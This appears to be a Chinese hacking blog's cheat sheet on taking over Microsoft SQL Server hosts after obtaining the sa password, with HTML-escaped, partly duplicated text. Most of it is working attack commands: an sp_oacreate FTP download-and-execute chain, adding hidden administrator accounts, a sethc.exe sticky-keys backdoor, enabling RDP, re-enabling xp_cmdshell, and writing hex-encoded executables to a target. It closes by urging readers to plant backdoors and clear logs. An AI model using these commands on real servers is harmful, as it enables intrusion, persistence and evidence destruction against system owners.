/>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />oacreate模式FTP下载:<br />DECLARE @s int EXEC sp_oacreate [wscript.shell], @s out<br />EXEC sp_oamethod @s,[run], NULL, [cmd &#x2F;c echo open FTP地址&gt;sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd &#x2F;c echo 123 &gt;&gt;sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd &#x2F;c echo 123 &gt;&gt;sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd &#x2F;c echo get 1433.exe sly.exe&gt;&gt;sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd &#x2F;c echo bye &gt;&gt;sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd &#x2F;c ftp -s:sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd &#x2F;c del sly.sys]<br />EXEC sp_oamethod @s,[run], NULL, [cmd &#x2F;c sly.exe]<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />不需要XP_CMDSHLL执行CMD命令<br />exec master.dbo.xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWAREMicrosoftJet4.0Engines’,’SandBoxMode’,’REG_DWORD’,1<br />select * from openrowset(‘microsoft.jet.oledb.4.0’,’;database&#x3D;c:winntsystem32iasias.mdb’,’select shell(&quot;cmd.exe &#x2F;c net user 用户 密码 &#x2F;add.&quot;)’)<br />exec master.dbo.xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWAREMicrosoftJet4.0Engines’,’SandBoxMode’,’REG_DWORD’,1<br />select * from openrowset(‘microsoft.jet.oledb.4.0’,’;database&#x3D;c:winntsystem32iasias.mdb’,’select shell(&quot;cmd.exe &#x2F;c net localgroup administrators 用户 &#x2F;add.&quot;)’)<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />SQL Server 阻止了对组件 ‘Ole Automation Procedures’ 的 过程’sys.sp_OACreate’ 的访问<br />sp_configure ‘show advanced options’, 1;<br />GO<br />RECONFIGURE;<br />GO<br />sp_configure ‘Ole Automation Procedures’, 1;<br />GO<br />RECONFIGURE;<br />GO<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />错误5是个系统提示的错误号，CreateProcess这个是创建线程的意思，这个错误产生和系统文件cmd.exe有很大的关系，一种情况是cmd被删除，一种是cmd的权限被降低了.<br />SQL查看终端端口及开放情况：<br />exec master..xp_regread ‘HKEY_LOCAL_MACHINE’,’SYSTEMCurrentControlSetControlTerminal ServerWinStationsRDP-Tcp’,’PortNumber’<br />好了，下面关键的地方了，要用到两条sql指令，将系统的explorer文件复制为系统的shift后门文件，下面两条语句为分别执行的，不可以放在一起执行，我是在sql tools 2.0工具里执行的，你也可以在分离器中执行，记得分别执行。<br />&#x2F;&#x2F;这条语句将explorer.exe复制为sethc.exe<br />declare @o int exec sp_oacreate ‘scripting.filesystemobject’, @o out exec sp_oamethod @o, ‘copyfile’,null,’c:windowsexplorer.exe’,’c:windowssystem32sethc.exe’;<br />&#x2F;&#x2F;这条语句将sethc.exe复制到dllcache目录下<br />declare @oo int exec sp_oacreate ‘scripting.filesystemobject’, @oo out exec sp_oamethod @oo, ‘copyfile’,null,’c:windowssystem32sethc.exe’,’c:windowssystem32dllcachesethc.exe’;<br />这个两条语句执行的时间间隔最好不超过10秒钟，否则系统会自动恢复原来的文件。<br />另外这两条语句使用到的sp_oacreate存储过程需要使用到odsole70.dll这个文件，所以这个文件的存亡，关系到创建的成功与否。<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />删除：<br />use master<br />exec sp_dropextendedproc ‘xp_cmdshell’<br />exec sp_dropextendedproc ‘xp_dirtree’<br />exec sp_dropextendedproc ‘xp_enumgroups’<br />exec sp_dropextendedproc ‘xp_fixeddrives’<br />exec sp_dropextendedproc ‘xp_loginconfig’<br />exec sp_dropextendedproc ‘xp_enumerrorlogs’<br />exec sp_dropextendedproc ‘xp_getfiledetails’<br />exec sp_dropextendedproc ‘Sp_OACreate’<br />exec sp_dropextendedproc ‘Sp_OADestroy’<br />exec sp_dropextendedproc ‘Sp_OAGetErrorInfo’<br />exec sp_dropextendedproc ‘Sp_OAGetProperty’<br />exec sp_dropextendedproc ‘Sp_OAMethod’<br />exec sp_dropextendedproc ‘Sp_OASetProperty’<br />exec sp_dropextendedproc ‘Sp_OAStop’<br />exec sp_dropextendedproc ‘Xp_regaddmultistring’<br />exec sp_dropextendedproc ‘Xp_regdeletekey’<br />exec sp_dropextendedproc ‘Xp_regdeletevalue’<br />exec sp_dropextendedproc ‘Xp_regenumvalues’<br />exec sp_dropextendedproc ‘Xp_regread’<br />exec sp_dropextendedproc ‘Xp_regremovemultistring’<br />exec sp_dropextendedproc ‘Xp_regwrite’<br />drop procedure sp_makewebtask<br />go<br />———————————————————————————-<br />———————-<br />–列出当前计算机名称–<br />———————-<br />execute master..xp_getnetname<br />——————————–<br />-列出当前计算机的驱动器可用空间-<br />——————————–<br />execute master..xp_fixeddrives<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />&#x3D;&#x3D;列出服务器所有本地组&#x3D;&#x3D;<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br><br />execute master..xp_enumgroups<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />&#x3D;&#x3D;获取MS SQL的版本号&#x3D;&#x3D;<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />execute master..sp_msgetversion<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />&#x3D;&#x3D;参数说明:目录名,目录深度,是否显示文件&#x3D;&#x3D;<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />execute master..xp_dirtree ‘c:’<br />execute master..xp_dirtree ‘c:’,1<br />execute master..xp_dirtree ‘c:’,1,1<br />——————————————————————————————————–<br />sql2005<br />恢复xp_cmdshell<br />EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;<br />关闭:<br />EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;<br />————————————————————————————————————-<br />把要转的文件拖到脚本上去, 就会生成包含HEX代码的文本.<br />然后用以下方法写入到对方计算机中。DECLARE @ObjectToken INT<br />EXEC sp_OACreate ‘ADODB.Stream’, @ObjectToken OUTPUT<br />EXEC sp_OASetProperty @ObjectToken, ‘Type’, 1<br />EXEC sp_OAMethod @ObjectToken, ‘Open’<br />EXEC sp_OAMethod @ObjectToken, ‘Write’, NULL, 0x123456(其中0x123456为HEX内容)<br />EXEC sp_OAMethod @ObjectToken, ‘SaveToFile’, NULL, ‘Test.exe(文件名)’, 2<br />EXEC sp_OAMethod @ObjectToken, ‘Close’<br />EXEC sp_OADestroy @ObjectToken<br />复制代码写入之后, 就发挥你的办法去执行你写入的这个文件就OK了<br />FILE2HEX.VBS<br />On Error Resume Next<br />FilePath &#x3D; Wscript.Arguments(0)<br />FieName &#x3D; Right(FilePath, Len(FilePath) - InStrRev(FilePath, &quot;&quot;))<br />With CreateObject(&quot;Adodb.Stream&quot;)<br />.Type &#x3D; 1: .open: .loadfromfile FilePath: Str &#x3D; .read: Sl &#x3D; LenB(Str)<br />End With<br /><br />Sll &#x3D; Sl Mod 65536: Slh &#x3D; Sl  65536<br />With CreateObject(&quot;Scripting.FileSystemObject&quot;).OpenTextFile(FilePath &amp; &quot;.txt&quot;, 2, True)<br />.Write &quot;0x&quot;<br />For i &#x3D; 1 To Sl<br />bt &#x3D; AscB(MidB(Str, i, 1))<br />If bt &lt; 16 Then .Write &quot;0&quot;<br />.Write Hex(bt)<br />Next<br />End With<br /><br />进去服务器后，创建隐藏用户。防止后门，清理日志，走人。。<br />嘿嘿，最后嘱咐一下，缺德的时候别多做。。看看就行，，</p>\n","site":{"data":{}},"excerpt":"","more":"<p>当你获得数据库的管理密码时，你还犹豫什么。提权吧、<br /><br />注意SQLDebuggerr用户<br />echo y|cacls c:windowssystem32net1.exe &#x2F;p everyone:f<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br /><br />Error Message:未能找到存储过程 ‘master..xp_cmdshell’<br />修复法：很通用的，其实碰到 其他126 127的都可以一起修复，<br />除了xplog70.dll其他的都可以用这命令修复<br />第一步先删除：<br />drop procedure sp_addextendedproc<br />drop procedure sp_oacreate<br />exec sp_dropextendedproc ‘xp_cmdshell’<br /><br />第二步恢复：<br />dbcc addextendedproc (&quot;sp_oacreate&quot;,&quot;odsole70.dll&quot;)<br />dbcc addextendedproc (&quot;xp_cmdshell&quot;,&quot;xplog70.dll&quot;)<br /><br />未能找到存储过程 ‘master..xp_cmdshell’<br />第一步:<br />create procedure sp_addextendedproc — 1996&#x2F;08&#x2F;30 20:13<br />@functname nvarchar(517),&#x2F;* (owner.)name of function to call<br /><em>&#x2F;<br />@dllname varchar(255)&#x2F;</em> name of DLL containing function <em>&#x2F;<br />as<br />set implicit_transactions off<br />if @@trancount &gt; 0<br />begin<br />raiserror(15002,-1,-1,’sp_addextendedproc’)<br />return (1)<br />end<br />dbcc addextendedproc( @functname, @dllname)<br />return (0) – sp_addextendedproc<br />GO<br />第二步:<br />EXEC sp_addextendedproc xp_cmdshell,@dllname &#x3D;’xplog70.dll’declare @o int<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />恢复cmdshell的sql语句<br />exec sp_addextendedproc xp_cmdshell ,@dllname &#x3D;’xplog70.dll’<br />开启cmdshell的sql语句<br />exec sp_addextendedproc xp_cmdshell ,@dllname &#x3D;’xplog70.dll’<br /><br />判断存储扩展是否存在<br />select count(</em>) from master.dbo.sysobjects where xtype&#x3D;’x’ and name&#x3D;’xp_cmdshell’<br />返回结果为1就ok<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br /><br />SQL Server 阻止了对组件 ‘xp_cmdshell’ 的 过程’sys.xp_cmdshell’ 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用 ‘xp_cmdshell’。有关启用 ‘xp_cmdshell’ 的详细信息，请参阅 SQL Server 联机丛书中的 &quot;外围应用配置器&quot;。<br />;EXEC sp_configure ‘show advanced options’, 1 –<br />;RECONFIGURE WITH OVERRIDE –<br />;EXEC sp_configure ‘xp_cmdshell’, 1 –<br />;RECONFIGURE WITH OVERRIDE –<br />;EXEC sp_configure&amp;#160;&amp;#160; ‘show advanced options’, 0 –<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br /><br />xplog70.dll修复：<br />Error Message:无法装载 DLL xplog70.dll 或该 DLL 所引用的某一 DLL。原因: 126(找不到指定的模块。)。<br />修复XPLOG70.DLL（先用文件查看下备份的目录下x86bin,然后把下面目录替换）<br />第一步<br />exec sp_dropextendedproc ‘xp_cmdshell’<br />第二步<br />dbcc addextendedproc (&quot;xp_cmdshell&quot;,&quot;c:sql2ksp4x86binnxplog70.dll&quot;)<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br /><br />恢复扩展存储过程的办法<br />先恢复sp_addextendedproc，语句如下：<br />第一：<br />create procedure sp_addextendedproc — 1996&#x2F;08&#x2F;30 20:13<br />@functname nvarchar(517),&#x2F;* (owner.)name of function to call <em>&#x2F; @dllname varchar(255)&#x2F;</em> name of DLL containing function <em>&#x2F; as<br />set implicit_transactions off<br />if @@trancount &gt; 0&amp;#160; <br />begin<br />raiserror(15002,-1,-1,’sp_addextendedproc’)&amp;#160; <br />return (1)&amp;#160; <br />end<br />dbcc addextendedproc( @functname, @dllname)&amp;#160; <br />return (0) – sp_addextendedproc<br />GO<br />第二：<br />use master&amp;#160; <br />exec sp_addextendedproc xp_cmdshell,’xp_cmdshell.dll’&amp;#160; <br />exec sp_addextendedproc xp_dirtree,’xpstar.dll’&amp;#160; <br />exec sp_addextendedproc xp_enumgroups,’xplog70.dll’&amp;#160; <br />exec sp_addextendedproc xp_fixeddrives,’xpstar.dll’&amp;#160; <br />exec sp_addextendedproc xp_loginconfig,’xplog70.dll’&amp;#160; <br />exec sp_addextendedproc xp_enumerrorlogs,’xpstar.dll’&amp;#160; <br />exec sp_addextendedproc xp_getfiledetails,’xpstar.dll’&amp;#160; <br />exec sp_addextendedproc sp_OACreate,’odsole70.dll’&amp;#160; <br />exec sp_addextendedproc sp_OADestroy,’odsole70.dll’&amp;#160; <br />exec sp_addextendedproc sp_OAGetErrorInfo,’odsole70.dll’&amp;#160; <br />exec sp_addextendedproc sp_OAGetProperty,’odsole70.dll’&amp;#160; <br />exec sp_addextendedproc sp_OAMethod,’odsole70.dll’&amp;#160; <br />exec sp_addextendedproc sp_OASetProperty,’odsole70.dll’&amp;#160; <br />exec sp_addextendedproc sp_OAStop,’odsole70.dll’&amp;#160; <br />exec sp_addextendedproc xp_regaddmultistring,’xpstar.dll’&amp;#160; <br />exec sp_addextendedproc xp_regdeletekey,’xpstar.dll’&amp;#160; <br />exec sp_addextendedproc xp_regdeletevalue,’xpstar.dll’&amp;#160; <br />exec sp_addextendedproc xp_regenumvalues,’xpstar.dll’&amp;#160; <br />exec sp_addextendedproc xp_regread,’xpstar.dll’&amp;#160; <br />exec sp_addextendedproc xp_regremovemultistring,’xpstar.dll’&amp;#160; <br />exec sp_addextendedproc xp_regwrite,’xpstar.dll’&amp;#160; <br />exec sp_addextendedproc xp_availablemedia,’xpstar.dll’<br /><br /><br />————————————————————————————–<br />一.更改sa口令方法：<br />用sql综合利用工具连接后，执行命令：<br />exec sp_password NULL,’新密码’,’sa’<br />(提示：慎用!)<br /><br />二.简单修补sa弱口令.<br />方法1:查询分离器连接后执行：<br />if exists (select * from<br />dbo.sysobjects where id &#x3D; object_id(N’[dbo].[xp_cmdshell]’) and<br />OBJECTPROPERTY(id, N’IsExtendedProc’) &#x3D; 1)<br />exec sp_dropextendedproc N’[dbo].[xp_cmdshell]’<br />GO<br />然后按F5键命令执行完毕<br /><br />方法2:查询分离器连接后<br />第一步执行：use master<br />第二步执行：sp_dropextendedproc ‘xp_cmdshell’<br />然后按F5键命令执行完毕<br /><br />无法装载 DLL xpsql70.dll 或该DLL所引用的某一 DLL。原因126（找不到指定模块。）<br />恢复方法：查询分离器连接后,<br />第一步执行：sp_dropextendedproc &quot;xp_cmdshell&quot;<br />第二步执行：sp_addextendedproc ‘xp_cmdshell’, ‘xpsql70.dll’<br /><br />无法在库 xpweb70.dll 中找到函数 xp_cmdshell。原因: 127(找不到指定的程序。)<br />恢复方法：查询分离器连接后,<br />第一步执行:exec sp_dropextendedproc ‘xp_cmdshell’<br />第二步执行:exec sp_addextendedproc ‘xp_cmdshell’,’xpweb70.dll’&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; <br />然后按F5键命令执行完毕<br /><br />如果以上方法均不可恢复,请尝试用下面的办法直接添加帐户:<br />查询分离器连接后,<br />2000servser系统:<br />declare @shell int exec sp_oacreate ‘wscript.shell’,@shell output exec sp_oamethod @shell,’run’,null,’c:winntsystem32cmd.exe &#x2F;c net user Web hacker &#x2F;add’<br />declare @shell int exec sp_oacreate ‘wscript.shell’,@shell output exec sp_oamethod @shell,’run’,null,’c:winntsystem32cmd.exe &#x2F;c net localgroup administrators Web &#x2F;add’<br />xp或2003server系统: 126错误！命令<br />declare @shell int exec sp_oacreate ‘wscript.shell’,@shell output exec sp_oamethod @shell,’run’,null,’c:windowssystem32cmd.exe &#x2F;c net user Web$ hacker &#x2F;add’<br />declare @shell int exec sp_oacreate ‘wscript.shell’,@shell output exec sp_oamethod @shell,’run’,null,’c:windowssystem32cmd.exe &#x2F;c net localgroup administrators Web$ &#x2F;add’<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />找不到存储过程 sp_addextendedproc<br />解决方法:<br />create procedure sp_addextendedproc — 1996&#x2F;08&#x2F;30 20:13<br />@functname nvarchar(517),&#x2F;</em> (owner.)name of function to call <em>&#x2F;<br />@dllname varchar(255)&#x2F;</em> name of DLL containing function *&#x2F;<br />as<br />set implicit_transactions off<br />if @@trancount &gt; 0<br />begin<br />raiserror(15002,-1,-1,’sp_addextendedproc’)<br />return (1)<br />end<br />dbcc addextendedproc( @functname, @dllname)<br />return (0) – sp_addextendedproc<br />GO<br />这段代码贴入查询分离器,执行<br />查看目录<br />exec master.dbo.xp_subdirs ‘c:’<br />列出磁盘<br />e<br>xec master..xp_fixeddrives<br />xpsql.cpp: 错误 5 来自 CreateProcess（第 737 行） 直接加帐号！<br />EXEC master.dbo.xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SoftWareMicrosoftJet4.0Engines’,’SandBoxMode’,’REG_DWORD’,0<br />Select * From OpenRowSet(‘Microsoft.Jet.OLEDB.4.0’,’;Database&#x3D;c:windowssystem32iasias.mdb’,’select shell(&quot;net user 123 123 &#x2F;add&quot;)’);<br />Select * From OpenRowSet(‘Microsoft.Jet.OLEDB.4.0’,’;Database&#x3D;c:windowssystem32iasias.mdb’,’select shell(&quot;net localgroup administrators 123 &#x2F;add&quot;)’);<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />开3389：<br />exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEMCurrentControlSetControlTerminal Server’,’fDenyTSConnections’,’REG_DWORD’,0;–<br />关3389：<br />exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEMCurrentControlSetControlTerminal Server’,’fDenyTSConnections’,’REG_DWORD’,1;<br />查看3389端口<br />exec xp_regread ‘HKEY_LOCAL_MACHINE’,’SYSTEMCurrentControlSetControlTerminal ServerWinStationsRDP-Tcp’,’PortNumber’<br />普通CMD后门<br />xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionssethc.exe’,’debugger’,’reg_sz’,’c:windowssystem32cmd.exe’<br /><br />建立用户1-这里默认用户是Reconditeness密码9527可自行修改<br />select * from openrowset(‘microsoft.jet.oledb.4.0’,’;database&#x3D;c:winntsystem32iasias.mdb’,’select shell(&quot;cmd.exe &#x2F;c net1 user Reconditeness 9527 &#x2F;ad &amp;net localgroup administrators terks &#x2F;ad&quot;)’)<br />select * from openrowset(‘microsoft.jet.oledb.4.0’,’;database&#x3D;c:windowssystem32iasias.mdb’,’select shell(&quot;cmd.exe &#x2F;c net1 user Reconditeness 9527 &#x2F;ad &amp;net localgroup administrators terks &#x2F;ad&quot;)’)<br /><br />win2K直接上PS马<br />exec master..xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWAREMicrosoftJet4.0Engines’,’SandBoxMode’,’REG_DWORD’,1<br />select * from openrowset(‘microsoft.jet.oledb.4.0’,’;database&#x3D;c:winntsystem32iasias.mdb’,’select 